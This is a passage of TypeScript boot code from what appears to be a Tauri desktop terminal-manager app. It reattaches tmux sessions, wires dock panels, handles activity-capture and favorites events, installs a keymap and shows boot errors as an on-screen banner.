  store.subscribe(updateFavBadge, ["aiFavs"]);
  updateFavBadge();
  // Activate anchor-positioning where it's not native (WebKit) AFTER the rail
  // exists, so the polyfill discovers the .rail-tip anchors. useAnimationFrame
  // keeps anchored elements positioned as layout/scroll changes. Gate on the
  // anchor() FUNCTION, not just the anchor-name property: WebKit may parse the
  // property while lacking positioning, which would skip the polyfill and leave
  // the tooltip stuck at the top.
  if (!CSS.supports("left: anchor(--x right)")) {
    anchorPolyfill({ useAnimationFrame: true }).catch(console.error);
  }
  wireChrome();
  // A dock failure must not abort the rest of boot (sessions, pty listeners).
  try {
    onDockChange(syncToggles); // keep rail highlights in sync as panels open/close
    mountReactDock($("#dock")); // dockview-react renders + adopts the pooled panels
    syncToggles();
  } catch (e) {
    showError("wireDock", e);
  }
  wireWindowResize();
  wireRailResize();
  wireOsDrop().catch((e) => showError("wireOsDrop", e));
  // Capture the right-click Y (capture phase, before wireContextMenu's bubble
  // handler) so ctxItemsFor can map it to a terminal buffer row for turn-identify.
  document.addEventListener("contextmenu", (e) => (lastCtxY = e.clientY), true);
  wireContextMenu(ctxItemsFor);
  await refreshSessions();
  // Scan worktrees in the background so session rows can show which worktrees
  // they've touched; re-relate sessions once the scan lands.
  scanWorktrees().then(refreshSessions).catch(() => {});

  await listen<{ id: string; chunk: string }>("pty-data", (e) => {
    tabs.get(e.payload.id)?.term.write(e.payload.chunk);
  });

  // Reattach tabs that were open before the reload. The tmux sessions (and the
  // agents inside) are still alive in the Rust backend; `tmux new-session -A`
  // reattaches. Capture the wanted active id first — openTab() flips active as
  // it replays — then restore it once all tabs exist.
  const wantActive = store.get().active;
  replaying = true; // don't log restored tabs as fresh visits
  for (const t of store.get().openTabs) {
    openTab(t.name, { command: t.command, cwd: t.cwd });
  }
  replaying = false;
  if (wantActive && tabs.has(wantActive)) activate(wantActive);

  // Each new activity row (browser ingest, os capture, file open) arrives here;
  // prepend, newest-first, capped.
  await listen<Event>("activity-added", (e) => {
    store.set({
      activity: [e.payload, ...store.get().activity].slice(0, ACTIVITY_CAP),
    });
  });

  // Per-gesture capture outcome (shot saved, or the reason it was skipped) —
  // drives the Activity panel's live status line + permission banner.
  await listen<CaptureStatus>("capture-status", (e) => {
    store.set({ captureStatus: e.payload });
  });

  // favorites.db mutated (add/remove) — refresh the mirror so any open panel
  // re-renders. The emitting command also returns the list, but this keeps
  // multiple windows / out-of-band edits in sync.
  await listen<Fav[]>("favorites-changed", (e) => {
    store.set({ aiFavs: e.payload });
  });

  // Summon: replay entrance animation + refocus active terminal.
  await listen("summoned", () => {
    const app = $("#app");
    app.classList.remove("summon-in");
    void app.offsetWidth; // restart the CSS animation
    app.classList.add("summon-in");
    refreshSessions();
    // Window may reappear at a new size/position; refit so the grid (and the
    // tmux pane behind it) matches, otherwise the TUI draws clipped.
    const id = activeId();
    if (id) {
      const t = tabs.get(id);
      requestAnimationFrame(() => {
        t?.fit.fit();
        t?.term.focus();
      });
    }
  });

  // Each terminal panel refits itself via dockview's onDidDimensionsChange
  // (wired through onTermLayout -> fitTerm), so no global ResizeObserver here.

  // Esc hides the popover.
  window.addEventListener("keydown", (e) => {
    if (e.key === "Escape") getCurrentWindow().hide();
  });

  // Central keymap: binds the command table on the window. The focused-terminal
  // path is intercepted inside attachCustomKeyEventHandler (runMatchingCommand)
  // so combos aren't typed into the pty.
  installKeymap(TAB_COMMANDS);

  // Right-⌘ + Right-⇧ + V: the native tap (lib.rs) swallows the combo, copies
  // the focused app's selection, and emits the text here. Write it straight into
  // the active terminal (no picker).
  await listen<string>("send-highlight-text", (e) => {
    const id = activeId();
    const text = e.payload;
    if (!text || !text.trim()) return showError("highlight", "nothing selected to send");
    if (id) sendTextToTab(id, text + " ");
  });

  // Tray menu "Recording" item toggles capture (same path as the panel button).
  await listen("toggle-record", () => toggleRecording());

  // Click-outside dismiss: hide when the window loses focus. Gated on a prior
  // focus so it doesn't self-hide at launch, and suppressed during screenshot.
  const win = getCurrentWindow();
  let everFocused = false;
  await win.onFocusChanged(({ payload: focused }) => {
    if (focused) {
      everFocused = true;
      cancelHide();
      return;
    }
    if (everFocused && !capturing && !draggingIn) {
      // Defer so a drag-in (which blurs us) can land; a drag-enter cancels it.
      cancelHide();
      hideTimer = window.setTimeout(() => win.hide(), 500);
    }
  });
}

// Surface any boot/runtime error as a visible banner — the webview console
// isn't reachable from the terminal, so this is how errors get seen.
function showError(label: string, err: unknown) {
  const msg = err instanceof Error ? `${err.message}\n${err.stack ?? ""}` : String(err);
  let el = document.getElementById("boot-error");
  if (!el) {
    el = document.createElement("pre");
    el.id = "boot-error";
    el.style.cssText =
      "position:fixed;left:8px;right:8px;bottom:8px;z-index:99999;max-height:40%;overflow:auto;margin:0;padding:8px;background:#a00;color:#fff;font:11px/1.4 Menlo,monospace;white-space:pre-wrap;border:2px solid #fff;";
    document.body.appendChild(el);
  }
  el.textContent = `[${label}] ${msg}`;
  console.error(label, err);
}
window.addEventListener("error", (e) => showError("error", e.error ?? e.message));
window.addEventListener("unhandledrejection", (e) => showError("promise", e.reason));

main().catch((e) => showError("main", e));
